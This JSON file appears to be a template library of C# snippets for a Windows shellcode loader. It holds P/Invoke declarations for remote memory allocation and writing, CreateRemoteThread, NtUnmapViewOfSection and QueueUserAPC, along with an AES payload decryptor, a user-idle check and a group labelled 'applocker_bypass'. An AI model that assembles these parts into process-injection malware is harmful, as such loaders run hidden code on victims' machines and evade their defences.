{
  "Directives": {
    "base": [
      "using System;",
      "using System.Runtime.InteropServices;",
      "using System.Security.Cryptography;",
      "using System.Collections.Generic;"
    ],
    "io": [
      "using System.IO;",
      "using System.Diagnostics;"
    ],
    "networking": [
      "using System.Net;",
      "using System.Net.Sockets;"
    ],
    "management": [
      "using System.Management;"
    ],
    "linq": [
      "using System.Linq;"
    ],
    "threading": [
      "using System.Threading;",
      "using System.Threading.Tasks;"
    ]
  },
  
  "Constants": {
    "window_management": [
      "const int SW_HIDE = 0;"
    ],
    "memory_protection": [
      "const uint MEM_COMMIT = 0x1000;",
      "const uint MEM_RESERVE = 0x2000;",
      "const uint PAGE_EXECUTE_READWRITE = 0x40;"
    ],
    "process_access": [
      "const uint PROCESS_ALL_ACCESS = 0x001F0FFF;",
      "const uint PROCESS_CREATE_THREAD = 0x0002;",
      "const uint PROCESS_VM_OPERATION = 0x0008;",
      "const uint PROCESS_VM_WRITE = 0x0020;"
    ]
  },
  
  "FunctionDeclarations": {
    "kernel32_basic": [
      "[DllImport(\"kernel32.dll\")] static extern IntPtr GetConsoleWindow();",
      "[DllImport(\"kernel32.dll\")] static extern int GetLastError();"
    ],
    "kernel32_memory": [
      "[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);"
    ],
    "kernel32_threading": [
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);"
    ],
    "kernel32_process": [
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);"
    ],
    "user32": [
      "[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);",
      "[DllImport(\"user32.dll\")] static extern uint GetLastInputInfo(ref LASTINPUTINFO plii);"
    ],
    "ntdll": [
      "[DllImport(\"ntdll.dll\")] static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);"
    ],
    "applocker_bypass": [
      "[DllImport(\"kernel32.dll\")] static extern void Sleep(uint dwMilliseconds);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr LoadLibraryA(string lpLibFileName);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern void SleepEx(uint dwMilliseconds, bool bAlertable);"
    ]
  },
  
  "Structures": {
    "process_structures": [
      "[StructLayout(LayoutKind.Sequential)]",
      "public struct STARTUPINFO",
      "{",
      "    public uint cb;",
      "    public string lpReserved;",
      "    public string lpDesktop;",
      "    public string lpTitle;",
      "    public uint dwX;",
      "    public uint dwY;",
      "    public uint dwXSize;",
      "    public uint dwYSize;",
      "    public uint dwXCountChars;",
      "    public uint dwYCountChars;",
      "    public uint dwFillAttribute;",
      "    public uint dwFlags;",
      "    public short wShowWindow;",
      "    public short cbReserved2;",
      "    public IntPtr lpReserved2;",
      "    public IntPtr hStdInput;",
      "    public IntPtr hStdOutput;",
      "    public IntPtr hStdError;",
      "}",
      "",
      "[StructLayout(LayoutKind.Sequential)]",
      "public struct PROCESS_INFORMATION",
      "{",
      "    public IntPtr hProcess;",
      "    public IntPtr hThread;",
      "    public uint dwProcessId;",
      "    public uint dwThreadId;",
      "}"
    ],
    "input_structures": [
      "[StructLayout(LayoutKind.Sequential)]",
      "public struct LASTINPUTINFO",
      "{",
      "    public uint cbSize;",
      "    public uint dwTime;",
      "}"
    ]
  },
  
  "Functions": {
    "aes_decrypt": [
      "static byte[] AESDecrypt(byte[] encryptedData, byte[] key, byte[] iv)",
      "{",
      "    try",
      "    {",
      "        using (Aes aesAlg = Aes.Create())",
      "        {",
      "            aesAlg.Key = key;",
      "            aesAlg.IV = iv;",
      "            aesAlg.Mode = CipherMode.CBC;",
      "            aesAlg.Padding = PaddingMode.PKCS7;",
      "            using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))",
      "            {",
      "                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);",
      "            }",
      "        }",
      "    }",
      "    catch",
      "    {",
      "        return null;",
      "    }",
      "}"
    ],
    "get_last_input_time": [
      "static uint GetLastInputTime()",
      "{",
      "    try",
      "    {",
      "        LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();",
      "        lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);",
      "        GetLastInputInfo(ref lastInputInfo);",
      "        return ((uint)Environment.TickCount - lastInputInfo.dwTime);",
      "    }",
      "    catch",
      "    {",
      "        return 0;",
      "    }",
      "}"
    ]
  }
}
